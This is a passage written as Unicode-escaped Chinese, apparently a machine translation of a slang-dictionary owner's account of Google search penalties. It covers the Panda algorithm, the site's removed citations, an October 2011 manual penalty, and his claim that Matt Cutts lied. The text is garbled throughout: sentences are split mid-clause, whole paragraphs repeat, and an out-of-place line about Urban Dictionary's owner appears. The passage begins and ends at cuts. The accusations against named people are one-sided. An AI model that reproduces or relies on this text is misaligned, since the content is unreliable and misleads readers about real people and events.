8981\u56de\u5e94-\u751a\u81f3\u77e5\u9053-\u8c37\u6b4c\u6545\u610f\u9650\u5236\u7684\u4e8b\u5b9e\r\u4ed6\u4eec\u7f51\u7ad9\u7684\u8bbf\u95ee\u8005\u3002\u7f51\u7ad9\u7684\u751f\u6b7b\u53d6\u51b3\u4e8e\u8bbf\u95ee\u8be5\u7f51\u7ad9\u7684\u4eba\u3002\r\u8fd9\u610f\u5473\u7740\u8c37\u6b4c\u627c\u6740\u4e86\u7f51\u7ad9\r\u79c1\u4e0b\u8fdb\u884c\uff0c\u7f51\u7ad9\u6240\u6709\u8005\u6ca1\u6709\u8ffd\u7d22\u6743\u3002\u800c\u4e14\u6ca1\u6709\u4efb\u4f55\u76d1\u7763\u6216\u8d23\u4efb\u3002\nUrban Dictionary\u7684\u6240\u6709\u8005\u3001\u8c37\u6b4c\u524d\u96c7\u5458\u4e9a\u4f26\u00b7\u4f69\u5361\u59c6(Aaron Peckham)\u4e0e\u8c37\u6b4c\u524d\u60e9\u7f5a\u8d1f\u8d23\u4eba\u9a6c\u7279\u00b7\u5361\u8328(Matt Cutts)\u5728\u4e00\u8d77\u3002\n\u636e\u6211\u6240\u77e5\uff0c\u8c37\u6b4c\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u6467\u6bc1\u7f51\u7ad9\u7684\u80fd\u529b\r\u4e4b\u524d\u62ab\u9732\u8fc7\u7684\u3002\n\u6211\u662f\u5728\u4e00\u4e2a\u544a\u5bc6\u8005\u901a\u77e5\u6211\u4e4b\u540e\u624d\u77e5\u9053\u8fd9\u4e00\u5904\u7f5a\u7684\u3002\n\u53e6\u5916\uff0c\u5f53\u9762\u5bf9\u8fd9\u4e00\u9690\u85cf\u7684\u5904\u7f5a\u65f6\uff0c\u4e00\u540d\u8c37\u6b4c\u5458\u5de5\u6492\u8c0e\r\u6211\u548c\u516c\u4f17\u90fd\u77e5\u9053\u8fd9\u4ef6\u4e8b\u3002\u90a3\u4e2a\u8c37\u6b4c\u5458\u5de5\u5c31\u662f\u9a6c\u7279\u00b7\u5361\u8328\uff0c\r\u8c37\u6b4c\u8d1f\u8d23\u5bf9\u7f51\u7ad9\u5b9e\u65bd\u5904\u7f5a\u7684\u56e2\u961f\u7684\u524d\u8d1f\u8d23\u4eba\u3002\u4ed6\u6084\u6084\u5730\r\u5728\u4f11\u5b8c\u957f\u5047\u540e\u79bb\u5f00\u4e86\u516c\u53f8\uff0c\u800c\u4e14\uff0c\u5f88\u660e\u663e\uff0c\u8fd8\u6ca1\u6709\u4eba\u53d7\u96c7\u6765\u505a\u8fd9\u4ef6\u4e8b\u3002\r\u6362\u6389\u4ed6\u3002\n\u8fd9\u662f\u6700\u521d\u7684\u4fe1\u606f\u70b9\u6ef4\u3002\u6211\u4f1a\u5728\u4e0a\u9762\u53d1\u5e03\u66f4\u591a\u4fe1\u606f\r\u65f6\u95f4\u5230\u4e86\u3002\u4f8b\u5982\uff0c\u6574\u4e2a\u6574\u4e2a\r\u4e0e\u4e3e\u62a5\u4eba\u7684\u901a\u4fe1\u5386\u53f2\u8bb0\u5f55-\u5305\u62ec\u5173\u8054\u5143\u6570\u636e\u3002\n\u8bf7\u5e2e\u6211\u628a\u8fd9\u4e2a\u6d88\u606f\u4f20\u64ad\u51fa\u53bb\u3002\u5982\u679c\u4f60\u627e\u5230\u4e86\u5728\u7ebf\u4fda\u8bed\u8bcd\u5178\r\u8981\u6709\u7528\uff0c\u8bf7\u8ba9\u4f60\u7684\u670b\u53cb\u548c\u540c\u4e8b\u77e5\u9053\u8fd9\u4e2a\u7f51\u7ad9\u3002\u552f\u4e00\u80fd\u8ba9\u4f60\r\u7701\u7701\u5427\uff0c\u5c31\u662f\u4e3a\u4e86\u628a\u8bdd\u8bf4\u51fa\u6765\u3002\n\u7531\u6c83\u5c14\u7279\u00b7\u96f7\u5fb7\u4e8e1996\u5e74\u521b\u7acb\u7684\u5728\u7ebf\u4fda\u8bed\u8bcd\u5178\u662f\u7f51\u7edc\u4e0a\u6700\u53e4\u8001\u7684\u4fda\u8bed\u8bcd\u5178\r\u4e5f\u662f\u7b2c\u4e00\u5bb6\u63a5\u53d7\u53c2\u89c2\u8005\u63d0\u4ea4\u7684\u7f51\u7ad9\u3002\u6bcf\u6708\u4e3a150\u4e07\u6e38\u5ba2\u63d0\u4f9b\u670d\u52a1\uff0c\r\u5b83\u4e3a19,000\u591a\u4e2a\u5b9e\u9645\u4fda\u8bed\u5355\u8bcd\u63d0\u4f9b\u4e8628,000\u591a\u4e2a\u5b9e\u9645\u5b9a\u4e49\r\u548c\u77ed\u8bed\u3002\u8be5\u7f51\u7ad9\u63d0\u4f9b\u4e86\u7f51\u7edc\u4e0a\u552f\u4e00\u7684\u4fda\u8bed\u540c\u4e49\u8bcd\u5e93\uff0c\u5b83\u662f\u5b8c\u5168\u96c6\u6210\u7684\u3002\r\u7528\u5b57\u5178\u3002\u5176\u4ed6\u72ec\u7279\u7684\u529f\u80fd\u5305\u62ec\u5411\u4f60\u5c55\u793a\u6bcf\u4e2a\u5355\u8bcd\u6709\u591a\u5e38\u89c1\uff0c\r\u5b83\u662f\u591a\u4e48\u7c97\u4fd7\uff0c\u5728\u54ea\u91cc\u4f7f\u7528\u5b83\u7684\u5730\u7406\u4f4d\u7f6e\u3002\u767b\u5f55\u7684\u8bbf\u95ee\u8005\u53ef\u4ee5\u6dfb\u52a0\u5355\u8bcd\u548c\r\u5b9a\u4e49\u3002\n\u8fd9\u4e2a\u7f51\u7ad9\u5e76\u4e0d\u5b8c\u7f8e\uff1a\u6211\u5b8c\u5168\u627f\u8ba4\u8fd9\u4e00\u70b9\u3002\u6211\u53ea\u5e0c\u671b\u6211\u7684\u7f51\u7ad9\u80fd\u591f\r\u4ee5\u81ea\u5df1\u7684\u4f18\u52bf\u7ade\u4e89\uff0c\u800c\u4e0d\u662f\u88ab\u8c37\u6b4c\u6545\u610f\u524a\u5f31\u3002\n\u8fd9\u4e2a\u7f51\u7ad9\u67095700\u591a\u6761\u6765\u81ea\u7535\u89c6\u7b49\u51fa\u7248\u6765\u6e90\u7684\u624b\u5de5\u5f15\u7528\r\u8282\u76ee\u3001\u7535\u5f71\u3001\u65b0\u95fb\u51fa\u7248\u7269\u548c\u6742\u5fd7-\u5e76\u624b\u52a8\u6dfb\u52a0\u5230\u76f8\u5e94\u7684\r\u5b9a\u4e49\u3002\u6bcf\u4e00\u7bc7\u90fd\u662f\u4e00\u6bb5\u7b80\u77ed\u76841-3\u53e5\u8bdd\u6458\u5f55\uff0c\u5e76\u6709\u9002\u5f53\u7684\u5f52\u5c5e\u3002\u672c\u7ad9\r\u662f\u7f51\u7edc\u4e0a\u552f\u4e00\u4e00\u672c\u514d\u8d39\u63d0\u4f9b\u7684\u6709\u5f15\u6587\u7684\u4fda\u8bed\u8bcd\u5178\u3002\n\u8c37\u6b4c\u5bf9\u8be5\u7f51\u7ad9\u6267\u884c\u7684\u7b2c\u4e00\u4e2a\u5904\u7f5a\u662f\u81ea\u52a8\u6267\u884c\u7684\u3002\u5c31\u662f\u8bf4\uff0c\r\u60e9\u7f5a\u662f\u7531\u7b97\u6cd5\u5b9e\u65bd\u7684\uff0c\u800c\u4e0d\u662f\u7531\u4eba\u5b9e\u65bd\u7684\u3002\u8be5\u7b97\u6cd5\u6709\u4e00\u4e2a\u7f3a\u9677\uff1a\u5b83\r\u9519\u8bef\u5730\u8ba4\u4e3a\u6b64\u7ad9\u70b9\u4e0a\u7684\u5f15\u7528\u662f\u4f4e\u8d28\u91cf\u7ad9\u70b9\u7684\u6307\u793a\r\u8fd9\u5e94\u8be5\u53d7\u5230\u60e9\u7f5a\u3002\n\u6b64\u5916\uff0c\u8c37\u6b4c\u5bf9\u7f51\u7ad9\u6240\u6709\u8005\u9690\u85cf\u4e86\u81ea\u52a8\u5904\u7f5a\uff0c\u56e0\u6b64\u6ca1\u6709\u529e\u6cd5\r\u6211\u60f3\u77e5\u9053\u5904\u7f5a\u7684\u539f\u56e0\u3002\n\u771f\u6b63\u7684\u5b57\u5178\u6709\u5f15\u6587\uff0c\u56e0\u4e3a\u8fd9\u662f\u5b83\u4eec\u5982\u4f55\u663e\u793a\u5176\u5b9a\u4e49\u7684\r\u90fd\u662f\u771f\u5b9e\u7684\u3002\u4f5c\u4e3a\u4e00\u672c\u771f\u6b63\u7684\u4fda\u8bed\u8bcd\u5178\uff0c\u8fd9\u540c\u6837\u9002\u7528\u4e8e\u6211\u4eec\u3002\u5f15\u6587\r\u8bcd\u5178\u7684\u4f5c\u7528\u4e0e\u7ef4\u57fa\u767e\u79d1\u76f8\u540c\uff1a\u5b83\u4eec\u63d0\u4f9b\u8bc1\u636e\r\u6240\u9648\u8ff0\u7684\u4e8b\u5b9e\u3002\u4e0e\u7ef4\u57fa\u767e\u79d1\u7b49\u767e\u79d1\u5168\u4e66\u4e0d\u540c\uff0c\u8bcd\u5178\u5f15\u7528\r\u5185\u8054\u6458\u5f55\uff0c\u800c\u4e0d\u662f\u6307\u5411\u5916\u90e8\u4f5c\u54c1\u7684\u94fe\u63a5\u3002\n\u5728\u8c37\u6b4c\u8fdb\u884c\u4e86\u51e0\u4e2a\u6708\u7684\u8fd9\u79cd\u7b97\u6cd5\u4e4b\u540e\uff0c\u6545\u610f\u5c06\u6d41\u91cf\u9650\u5236\u5728\u8fd9\u4e2a\u8303\u56f4\u5185\r\u7ad9\u70b9\uff0c\u7ecf\u8fc7\u51e0\u4e2a\u6708\u7684\u8bd5\u9a8c\u548c\u5bf9\u7ad9\u70b9\u8fdb\u884c\u7684\u6570\u5343\u6b21\u66f4\u6539\u540e\uff0c\u6211\r\u5220\u9664\u4e86\u5f15\u6587-\u8d85\u8fc75700\u6761\u3002\u8fd9\u662f\u4e00\u6b21\u5b64\u6ce8\u4e00\u63b7\u7684\u5b9e\u9a8c\uff0c\u6211\u8bd5\u8fc7\u4e86\r\u6211\u80fd\u60f3\u5230\u7684\u6240\u6709\u5176\u4ed6\u529e\u6cd5\u90fd\u662f\u4e3a\u4e86\u6d88\u9664\u70b9\u7403\u3002\u8fd9\u5bfc\u81f4\u4e86\u5904\u7f5a\r\u7531\u7b97\u6cd5\u518d\u6b21\u81ea\u52a8\u64a4\u9500\u3002\n\u8c37\u6b4c\u7684\u4e00\u540d\u5458\u5de5\u540e\u6765\u5bf9\u8be5\u7f51\u7ad9\u6267\u884c\u4e86\u624b\u52a8\u5904\u7f5a\u3002\u56de\u60f3\u4e00\u4e0b\uff0c\u4e00\u4e2a\r\u5bf9\u7f51\u7ad9\u7684\u5904\u7f5a\u4f1a\u5bfc\u81f4\u8be5\u7f51\u7ad9\u4e0a\u7684\u7f51\u9875\u663e\u793a\u5728\r\u8c37\u6b4c\u7684\u641c\u7d22\u7ed3\u679c\u6bd4\u4ed6\u4eec\u51ed\u501f\u81ea\u5df1\u7684\u4f18\u70b9\u8d62\u5f97\u7684\u4f4d\u7f6e\u66f4\u91cd\u8981\u3002\u4e00\u672c\u624b\u518c\r\u60e9\u7f5a\u662f\u7531\u4eba\u7528\u624b\u6fc0\u6d3b\u7684\u60e9\u7f5a\u3002\n2011\u5e7410\u67089\u65e5\uff0c\u8c37\u6b4c\u7684\u4e00\u540d\u5458\u5de5\u8bbe\u7f6e\u4e86\u4e00\u9762\u5185\u90e8\u65d7\u5e1c\uff0c\u6267\u884c\u4e86\u4e00\u9879\u5904\u7f5a\r\u4ee5\u4e00\u79cd\u65e2\u65e0\u6cd5\u64a4\u6d88\u53c8\u65e0\u6cd5\u68c0\u6d4b\u7684\u65b9\u5f0f\u653b\u51fb\u6b64\u7ad9\u70b9\r\u7f51\u7ad9\u6240\u6709\u8005(\u6211\u3002)\u3002\n\u6211\u662f\u5728\u4e00\u4e2a\u544a\u5bc6\u8005\u901a\u77e5\u6211\u4e4b\u540e\u624d\u77e5\u9053\u8fd9\u4e00\u5904\u7f5a\u7684\u3002\n\u8fd9\u4e00\u5904\u7f5a\u6ca1\u6709\u771f\u5b9e\u7684\u7406\u7531\u3002\u7136\u800c\uff0c\u5f53\u4e00\u672c\u624b\u518c\r\u5982\u679c\u60e9\u7f5a\u88ab\u6fc0\u6d3b\uff0c\u5219\u53ef\u4ee5\u8bb0\u5f55\u539f\u56e0\u3002\u8c37\u6b4c\u5458\u5de5\u8bb0\u5f55\u4e86\u539f\u56e0\r\u56e0\u4e3a\u5b83\u4e0e\u77e5\u8bc6\u4ea7\u6743\u6cd5\u6709\u5173\u3002\u4f46\u90a3\u6ca1\u6709\u610f\u4e49\uff0c\u56e0\u4e3a\u6ca1\u6709-\r\u5e76\u4e14\u4ece\u672a\u5728\u672c\u7f51\u7ad9\u4e0a\u8fdd\u53cd\u8fc7\u4efb\u4f55\u77e5\u8bc6\u4ea7\u6743\u6cd5\u5f8b\u3002\n\u5982\u679c\u4f60\u5728\u8c37\u6b4c\u5de5\u4f5c\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5feb\u518d\u8c08\u3002\u6211\u7684\u7535\u8bdd\u662f\u3002\n(\u663e\u793a\u6b64\u90e8\u5206\u9690\u85cf\u6b64\u90e8\u5206\u3002)\r\r2011\u5e74\uff0c\u8c37\u6b4c\u53d1\u5e03\u4e86\u4e00\u9879\u65e8\u5728\u60e9\u7f5a\u4f4e\u8d28\u91cf\u7684\u6392\u540d\u7b97\u6cd5\u7684\u66f4\u6539\r\u7f51\u7ad9\u3002\u8c37\u6b4c\u73b0\u5728\u8ba4\u4e3a\u7684\u4e00\u4ef6\u4e8b\u662f\u663e\u793a\u6458\u5f55\uff0c\u8fd9\u662f\u8d28\u91cf\u4f4e\u4e0b\u7684\u4e00\u4e2a\u6307\u6807\r\u5b58\u5728\u4e8e\u5176\u4ed6\u5730\u65b9\u7684\u5185\u5bb9\u3002\r\u5c3d\u7ba1\u5f15\u6587\u662f\u4e00\u672c\u9ad8\u8d28\u91cf\u8bcd\u5178\u7684\u6807\u5fd7\uff0c\u4f46\u5b83\u4eec\u7684\u89e3\u91ca\u65b9\u5f0f\u662f\r\u8fd9\u4e00\u53d8\u5316(\u79f0\u4e3a\u718a\u732b)\u662f\u5b8c\u5168\u76f8\u53cd\u7684\uff0c\u56e0\u4e3a\u6839\u636e\u5b9a\u4e49\r\u5f15\u6587\u662f\u5b58\u5728\u4e8e\u5176\u4ed6\u5730\u65b9\u7684\u5185\u5bb9\u3002\n\u8fd9\u4e2a\u7f51\u7ad9\u67095700\u591a\u6761\u6765\u81ea\u7535\u89c6\u7b49\u51fa\u7248\u6765\u6e90\u7684\u624b\u5de5\u5f15\u7528\r\u8282\u76ee\u3001\u7535\u5f71\u3001\u65b0\u95fb\u51fa\u7248\u7269\u548c\u6742\u5fd7-\u5e76\u624b\u52a8\u6dfb\u52a0\u5230\u76f8\u5e94\u7684\r\u5b9a\u4e49\u3002\u6bcf\u4e00\u7bc7\u90fd\u662f\u4e00\u6bb5\u7b80\u77ed\u76841-3\u53e5\u8bdd\u6458\u5f55\uff0c\u5e76\u6709\u9002\u5f53\u7684\u5f52\u5c5e\u3002\u672c\u7ad9\r\u662f\u7f51\u7edc\u4e0a\u552f\u4e00\u4e00\u672c\u514d\u8d39\u63d0\u4f9b\u7684\u6709\u5f15\u6587\u7684\u4fda\u8bed\u8bcd\u5178\u3002\n\u9664\u4e86\u8fd9\u4e2a\u7f51\u7ad9\u4e0a\u7684\u4e94\u5343\u4e03\u767e\u6761\u5f15\u6587\u5916\uff0c\u6211\u4eec\u8fd8\u6709\u4e00\u4e07\u4e00\u5343\u56db\u767e\u6761\u8981\u6dfb\u52a0\uff0c\r\u8fd9\u5c06\u4f7f\u603b\u5f15\u6587\u6570\u91cf\u8d85\u8fc71.7\u4e07\u6761\u3002\n\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u7ed9\u60a8\u770b\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u5b83\u4eec\u770b\u8d77\u6765\u662f\u9ed1\u8272\u7684\uff0c\u5c31\u50cf\u5728\u4e00\u4efd\u7ecf\u8fc7\u7f16\u8f91\u7684\r\u673a\u5bc6\u6587\u4ef6\u3002\u5f53\u8c37\u6b4c\u5f00\u59cb\u60e9\u7f5a\u8fd9\u4e2a\u7f51\u7ad9\u7684\u65f6\u5019\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\r\u6709\u5f15\u6587\u3002\u8c37\u6b4c\u7684\u4e00\u4e2a\u7b97\u6cd5\u4e2d\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u4e0e\u4e00\u7ec4\u66f4\u6539\u6709\u5173\r\u4ed6\u4eec\u79f0\u5176\u4e3a\u718a\u732b2.0\u3002\u6b64\u9519\u8bef\u9519\u8bef\u5730\u5c06\u5f15\u7528\u89e3\u91ca\u4e3a\r\u7f51\u7ad9\u7684\u8d28\u91cf\u5f88\u4f4e\uff0c\u5c3d\u7ba1\u5f15\u7528\u662f\u5b8c\u5168\u76f8\u53cd\u7684\u8ff9\u8c61\uff1aa\r\u9ad8\u8d28\u91cf\u7684\u8bcd\u5178\u3002\u8fd9\u4e00\u5904\u7f5a\u662f\u81ea\u52a8\u8fdb\u884c\u7684\uff1a\u5b83\u4e0d\u9700\u8981\u4efb\u4f55\u4eba\r\u5e72\u9884\u3002\u5220\u9664\u4f20\u7968\u4e5f\u4f1a\u5bfc\u81f4\u5904\u7f5a\u88ab\u5220\u9664\r\u81ea\u52a8\u7684\u3002\n\u56e0\u6b64\uff0c\u65e2\u7136\u6211\u4eec\u4e0d\u80fd\u5411\u60a8\u663e\u793a\u5f15\u6587\uff0c\u5c31\u6ca1\u6709\u7406\u7531\u6dfb\u52a0\u989d\u5916\u768411,400\u6761\u5f15\u6587\r\u5982\u4e0a\u6240\u8ff0\u3002\n\u4e0b\u9762\u663e\u793a\u4e86\u6b64\u5904\u7f5a\u7684\u540e\u679c\uff0c\u4ece\u8bbf\u95ee\u672c\u7f51\u7ad9\u7684\u6b21\u6570\u6765\u8861\u91cf\r\u8c37\u6b4c\u641c\u7d22\u3002\n4\u670811\u65e5\uff1a\u8c37\u6b4c\u5728\u5168\u7403\u8303\u56f4\u5185\u5411\u6240\u6709\u4eba\u53d1\u5e03\u718a\u732b\u7b97\u6cd5\u66f4\u6539\r\u8bf4\u82f1\u8bed\u7684\u7528\u6237\uff0c\u5e76\u5f00\u59cb\u60e9\u7f5a\u8fd9\u4e2a\u7f51\u7ad9\u3002\n11\u67085\u65e5\uff1a\u6211\u5220\u9664\u4e86\u6240\u6709\u7684\u5f15\u6587\uff0c\u4e3b\u8981\u662f\u4f5c\u4e3a\u4e00\u4e2a\u5b9e\u9a8c\u3002\u6211\u7b80\u76f4\u4e0d\u6562\u76f8\u4fe1\r\u8c37\u6b4c\u5c06\u56e0\u4e3a\u5f15\u6587\u7684\u5b58\u5728\u800c\u60e9\u7f5a\u4e00\u5bb6\u8bcd\u5178\u7f51\u7ad9\u3002\n\u8c37\u6b4c\u7684\u718a\u732b\u6539\u53d8-\u65e8\u5728\u60e9\u7f5a\u8c37\u6b4c\u7b97\u6cd5\u6240\u76f8\u4fe1\u7684\r\u8fd9\u4e9b\u4f4e\u8d28\u91cf\u7684\u7f51\u7ad9\u5df2\u4e8e4\u670811\u65e5\u5728\u5168\u7403\u8303\u56f4\u5185\u5411\u6240\u6709\u82f1\u8bed\u7528\u6237\u53d1\u5e03\u3002\r2011\u5e74\u3002\u5bf9\u5728\u7ebf\u4fda\u8bed\u8bcd\u5178\u7684\u8bbf\u95ee\u662f\u8c37\u6b4c\u641c\u7d22\u7684\u7ed3\u679c\r2011\u5e744\u670811\u65e5\uff0c\u641c\u7d22\u91cf\u660e\u663e\u4e0b\u964d\u3002\n\u6d41\u91cf\u635f\u5931\u4ec5\u9650\u4e8e\u8c37\u6b4c\u641c\u7d22\u7684\u8bbf\u95ee\u91cf\u3002\u6ca1\u6709\u5176\u4ed6\u6d41\u91cf\u6765\u6e90(\u5176\u4ed6\r\u641c\u7d22\u5f15\u64ce\uff0c\r\u76f4\u63a5\u6d41\u91cf\u6216\u8f6c\u4ecb\u6d41\u91cf)\u53d7\u5230\u5f71\u54cd\u3002\u8fd9\u6837\u7684\u964d\u5e45\u5bf9\u8be5\u7f51\u7ad9\u6765\u8bf4\u662f\u53f2\u65e0\u524d\u4f8b\u7684\u3002\r\u81ea\u4ece\u6211\u57282007\u5e74\u5f00\u59cb\u8ddf\u8e2a\u7f51\u7ad9\u5206\u6790\u4ee5\u6765\u3002\n\u5177\u4f53\u5730\u8bf4\uff0c\u6d41\u91cf\u4e0b\u964d\u662f\u56e0\u4e3a\u8c37\u6b4c\u5c06\u8fd9\u4e2a\u7f51\u7ad9\u79fb\u5230\u4e86\u66f4\u4f4e\u7684\u4f4d\u7f6e\r\u641c\u7d22\u7ed3\u679c\u3002\u6765\u81ea\u8c37\u6b4c\u7f51\u7ad9\u7ba1\u7406\u5458\u5de5\u5177\u7684\u62a5\u544a\u663e\u793a\uff0c\u5728\u7ebf\u4fda\u8bed\u7684\u5730\u4f4d\r\u8c37\u6b4c\u641c\u7d22\u7ed3\u679c\u4e2d\u7684\u5b57\u5178\u843d\u57284\u670811\u65e5\uff0c\u4e5f\u5c31\u662f\u718a\u732b\u88ab\u5904\u7f5a\u7684\u65e5\u671f\u3002\n\u6211\u53ef\u4ee5\u8bbf\u95ee\u7684\u62a5\u544a\u6db5\u76d6\u4e86\u4e00\u4e2a\u6708\u7684\u65f6\u95f4\u6bb5\uff0c\u800c\u4e0d\u662f\u4e00\u5929\u3002\u6240\u4ee5\r\u8fd9\u4e00\u5904\u7f5a\u7684\u6548\u679c\u5728\u65e5\u671f\u4e3a3\u670812\u65e5\u81f34\u670811\u65e5\u7684\u62a5\u544a\u4e2d\u624d\u5f00\u59cb\u53d8\u5f97\u660e\u663e\u3002\r\u4e0b\u4e00\u4efd\u6ce8\u660e\u65e5\u671f\u7684\u62a5\u544a\u5c06\u6301\u7eed\u52304\u670812\u65e5\uff0c\u56e0\u6b64\u5b83\u5305\u62ec2\u5929\u7684\u7f5a\u6b3e\u3002\u540e\u7eed\u7684\r\u62a5\u544a\u5305\u62ec3\u5929\u7684\u5904\u7f5a\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u7531\u4e8e\u66f4\u591a\u7684\u5904\u7f5a\u5929\u6570\u5728\r\u5728\u62a5\u544a\u7684\u65e5\u671f\u8303\u56f4\u5185\uff0c\u4e0b\u964d\u7684\u91d1\u989d\u8d8a\u6765\u8d8a\u591a\u5730\u66b4\u9732\u51fa\u6765\u3002\r\r(\u4e3a\u4ec0\u4e48\u5c3e\u76d8\u51fa\u73b0\u4e0a\u6da8\uff1f\u56e0\u4e3a\u62a5\u544a\u663e\u793a\u4e86\u4e00\u4e2a\u8303\u56f4\uff0c\u6240\u4ee5\u6700\u7ec8\u62a5\u544a\u5305\u62ec\r4\u670811\u65e5\u4e3b\u8981\u662f\u968f\u540e\u7684\u65e5\u671f\u3002\u5728\u6b64\u671f\u95f4\uff0c\u6392\u540d\u7565\u6709\u4e0a\u5347\u3002\r\u65e5\u671f-\u8fd9\u5e76\u6ca1\u6709\u6062\u590d\u6d41\u91cf-\u7136\u540e\u6392\u540d\u53c8\u56de\u843d\u4e86\u3002)\u3002\n\u6570\u636e\u663e\u793a\uff0c\u201c\u5728\u7ebf\u4fda\u8bed\u8bcd\u5178\u201d\u4ece4\u670811\u65e5\u5f00\u59cb\u53d7\u5230\u5904\u7f5a\uff0c\r2011\u5e74\uff0c\u4e5f\u5c31\u662f\u718a\u732b\u7684\u53d8\u5316\u5411\u6240\u6709\u8bf4\u82f1\u8bed\u7684\u7528\u6237\u53d1\u5e03\u7684\u65e5\u671f\r\u8c37\u6b4c\u7684\u3002\n\u5728\u63a5\u4e0b\u6765\u7684\u4e03\u4e2a\u6708\u91cc\uff0c\u6211\u505a\u4e86\u51e0\u5341\u4e2a\u7ed3\u6784\u4e0a\u7684\u6539\u53d8\u548c\u6570\u5343\u4e2a\u5185\u5bb9\r\u5bf9\u7f51\u7ad9\u7684\u66f4\u6539-\u4f46\u662f\r\u8fd9\u4e9b\u53d8\u5316\u5bf9\u8c37\u6b4c\u67e5\u8be2\u5f15\u7528\u7684\u6d41\u91cf\u6ca1\u6709\u5f71\u54cd\u3002\n\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5b9e\u9a8c\uff0c\u6211\u57282011\u5e7411\u67085\u65e5\u5220\u9664\u4e86\u7f51\u7ad9\u4e0a\u7684\u6240\u6709\u5f15\u6587\u3002\u6211\u505a\u4e0d\u5230\r\u6211\u76f8\u4fe1\u8c37\u6b4c\u4f1a\u56e0\u4e3a\u5f15\u6587\u7684\u5b58\u5728\u800c\u60e9\u7f5a\u8fd9\u4e2a\u7f51\u7ad9\u3002\u6bd5\u7adf,\r\u9ad8\u8d28\u91cf\u7684\u8bcd\u5178\u90fd\u6709\u5f15\u6587\uff0c\u800c\u8c37\u6b4c\u718a\u732b\u7684\u8bbe\u8ba1\u5c31\u662f\u4e3a\u4e86\u60e9\u7f5a\r\u4f4e\u8d28\u91cf\u7684\u7f51\u7ad9\u3002\n\u4e00\u5468\u96f6\u4e00\u5929\u540e\uff0c\u4e5f\u5c31\u662f11\u670813\u65e5\uff0c\u8fd9\u4e00\u5904\u7f5a\u88ab\u64a4\u9500\u3002\n(\u663e\u793a\u6b64\u90e8\u5206\u9690\u85cf\u6b64\u90e8\u5206\u3002)\r\r10\u67086\u65e5\uff1a\u76f8\u4fe1\u6211\u5df2\u7ecf\u627e\u5230\u4e86\u4e00\u79cd\u6062\u590d\u5f15\u7528\u7684\u65b9\u6cd5\uff0c\u800c\u4e0d\u662f\r\u62db\u81f4\u5904\u7f5a\u540e\uff0c\u6211\u5c06\u5b83\u4eec\u6dfb\u52a0\u56de\u7f51\u7ad9\u3002\n10\u67089\u65e5\uff1a\u4e00\u540d\u8c37\u6b4c\u5458\u5de5\u4f7f\u7528\u5185\u90e8\u5de5\u5177\u5bf9\u6b64\u8fdb\u884c\u5904\u7f5a\r\u5730\u70b9\u3002\n11\u670816\u65e5\uff1a\u80fd\u591f\u4e0e\u6ca1\u6709\u7684\u8bcd\u5178\u7f51\u7ad9\u7ade\u4e89\r\u5f15\u7528\uff0c\u6211\u518d\u6b21\u5220\u9664\r\u5f15\u6587\u3002\n\u8fd9\u4e9b\u5f15\u6587\u968f\u540e\u4ece\u8be5\u7f51\u7ad9\u4e0a\u6d88\u5931\u4e86\u8fd1\u4e00\u5e74\u30022012\u5e7410\u6708\u521d\uff0c\u6211\r\u786e\u5b9a\u4e86\u4e00\u79cd\u6211\u8ba4\u4e3a\u662f\u4e00\u79cd\u6062\u590d\u5bf9\u7f51\u7ad9\u7684\u5f15\u7528\u800c\u4e0d\u4f1a\u53d7\u5230\u60e9\u7f5a\u7684\u65b9\u6cd5\r\u8c37\u6b4c\u3002\u5f15\u7528\u7684\u5168\u90e8\u6e05\u5355-\u5f53\u65f6\u7ea6\u4e3a4800\u4efd-\u8fd4\u56de\u5230\r\u7f51\u7ad9\u4e8e2012\u5e7410\u67086\u65e5\u53d1\u5e03\u3002\n\u8c37\u6b4c\u5bf9\u8be5\u7f51\u7ad9\u6267\u884c\u7684\u7b2c\u4e8c\u6b21\u5904\u7f5a\u662f\u624b\u52a8\u7684\u3002\u56de\u60f3\u4e00\u4e0b\uff0c\u4e00\u4e2a\r\u5bf9\u7f51\u7ad9\u7684\u5904\u7f5a\u4f1a\u5bfc\u81f4\u8be5\u7f51\u7ad9\u4e0a\u7684\u7f51\u9875\u663e\u793a\u5728\r\u8c37\u6b4c\u7684\u641c\u7d22\u7ed3\u679c\u6bd4\u4ed6\u4eec\u51ed\u501f\u81ea\u5df1\u7684\u4f18\u70b9\u8d62\u5f97\u7684\u4f4d\u7f6e\u66f4\u91cd\u8981\u3002\u4e00\u672c\u624b\u518c\r\u60e9\u7f5a\u662f\u7531\u4eba\u7528\u624b\u6fc0\u6d3b\u7684\u60e9\u7f5a\u3002\n2011\u5e7410\u67089\u65e5\uff0c\u8c37\u6b4c\u7684\u4e00\u540d\u5458\u5de5\u8bbe\u7f6e\u4e86\u4e00\u9762\u5185\u90e8\u65d7\u5e1c\uff0c\u6267\u884c\u4e86\u4e00\u9879\u5904\u7f5a\r\u4ee5\u4e00\u79cd\u65e2\u65e0\u6cd5\u64a4\u6d88\u53c8\u65e0\u6cd5\u68c0\u6d4b\u7684\u65b9\u5f0f\u653b\u51fb\u6b64\u7ad9\u70b9\r\u7f51\u7ad9\u6240\u6709\u8005(\u6211\u3002)\u3002\n\u6211\u662f\u5728\u4e00\u4e2a\u544a\u5bc6\u8005\u901a\u77e5\u6211\u4e4b\u540e\u624d\u77e5\u9053\u8fd9\u4e00\u5904\u7f5a\u7684\u3002\n\u8fd9\u4e00\u5904\u7f5a\u6ca1\u6709\u771f\u5b9e\u7684\u7406\u7531\u3002\u7136\u800c\uff0c\u5f53\u4e00\u672c\u624b\u518c\r\u5982\u679c\u60e9\u7f5a\u88ab\u6fc0\u6d3b\uff0c\u5219\u53ef\u4ee5\u8bb0\u5f55\u539f\u56e0\u3002\u8c37\u6b4c\u5458\u5de5\u8bb0\u5f55\u4e86\u539f\u56e0\r\u56e0\u4e3a\u5b83\u4e0e\u77e5\u8bc6\u4ea7\u6743\u6cd5\u6709\u5173\u3002\u4f46\u90a3\u6ca1\u6709\u610f\u4e49\uff0c\u56e0\u4e3a\u6ca1\u6709-\r\u5e76\u4e14\u4ece\u672a\u5728\u672c\u7f51\u7ad9\u4e0a\u8fdd\u53cd\u8fc7\u4efb\u4f55\u77e5\u8bc6\u4ea7\u6743\u6